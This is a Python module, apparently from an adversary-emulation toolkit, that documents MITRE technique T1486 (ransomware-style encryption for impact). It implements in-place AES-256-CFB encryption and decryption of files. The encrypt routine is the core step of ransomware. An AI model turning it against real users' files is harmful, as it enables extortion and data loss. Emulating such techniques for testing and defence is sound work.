"""Data Encrypted for Impact

Adversaries may encrypt data on target systems or on large numbers of systems in a network to 
interrupt availability to system and network resources. 
They can attempt to render stored data inaccessible by encrypting files or data on local and 
remote drives and withholding access to a decryption key. 
This may be done in order to extract monetary compensation from a victim in exchange for 
decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases 
where the key is not saved or transmitted.

In the case of ransomware, it is typical that common user files like Office documents, PDFs, 
images, videos, audio, text, and source code files will be encrypted 
(and often renamed and/or tagged with specific file markers). 
Adversaries may need to first employ other behaviors, such as File and Directory Permissions 
Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate 
these files. 
In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.

To maximize impact on the target organization, malware designed for encrypting data may have 
worm-like features to propagate across a network by leveraging other attack techniques like 
Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. 
Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, 
or otherwise intimidate victims by sending ransom notes or other messages to connected printers 
(known as "print bombing").

In cloud environments, storage objects within compromised accounts may also be encrypted.

Mitre: `T1486 <https://attack.mitre.org/techniques/T1486/>`_

"""
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


def key_gen() -> bytes:
    """Generate a 32 random bytes.

    Returns:
        32 random bytes.
    """
    return get_random_bytes(32)


def aes_encrypt(path_file: str, key: bytes, buffer_size_bytes: int = 1) -> None:
    """Inplace AES 256 encryption using CFB Mode.

    Encrypts the file using the given key.
    A Initial Vector (16 bytes) used for encryption of the file is appended.
    Encrypted file structure: <file content><initial vector [16 bytes]>

    Args:
        path_file (str): Path to file.
        key (bytes): The key used for encryption.
        buffer_size_bytes (int, optional): Number of bytes read and encrypted at once.
        Defaults to 1.
    """
    initial_vector = get_random_bytes(16)
    cipher = AES.new(
        key=key,
        mode=AES.MODE_CFB,
        iv=initial_vector,
        segment_size=buffer_size_bytes * 8,
    )

    with open(path_file, "rb+") as file:
        data = file.read(buffer_size_bytes)  # read first block
        while data:
            file.seek(
                -buffer_size_bytes, 1
            )  # seek back relative from current pointer position
            file.write(cipher.encrypt(data))  # write encrypted data
            data = file.read(buffer_size_bytes)  # read next block
        file.seek(0, 2)  # go to the end and write iv
        file.write(initial_vector)


def aes_decrypt(path_file: str, key: bytes, buffer_size_bytes: int = 1) -> None:
    """Inplace AES 256 decryption using CFB Mode.

    Decrypts the file and removes the appended Initial Vector from end of the file.

    Args:
        path_file (str): Path to file.
        key (bytes): The key used for decryption.
        buffer_size_bytes (int, optional): Number of bytes read and decryption at once.
        Defaults to 1.
    """
    # Note: Be aware of the potential loss of the iv
    with open(path_file, "rb+") as file:
        file.seek(-16, 2)  # read iv from file
        iv_pos = file.tell()
        initial_vector = file.read(16)
        cipher = AES.new(
            key=key,
            mode=AES.MODE_CFB,
            iv=initial_vector,
            segment_size=buffer_size_bytes * 8,
        )

        file.seek(0, 0)  # go to beginning of file
        data = file.read(buffer_size_bytes)  # read first block
        while data:
            if file.tell() >= iv_pos:
                data = data.removesuffix(
                    initial_vector[: file.tell() - iv_pos]
                )  # remove iv from file
                dec_data = cipher.decrypt(data)
                print(f"{file.tell()}>{dec_data}")
                file.seek(
                    -buffer_size_bytes, 1
                )  # seek back relative from current pointer position
                file.truncate()  # truncate file to current pointer position
                file.write(dec_data)  # write decrypted data
                return
            dec_data = cipher.decrypt(data)
            file.seek(
                -buffer_size_bytes, 1
            )  # seek back relative from current pointer position
            file.write(dec_data)  # write decrypted data
            data = file.read(buffer_size_bytes)  # read next block
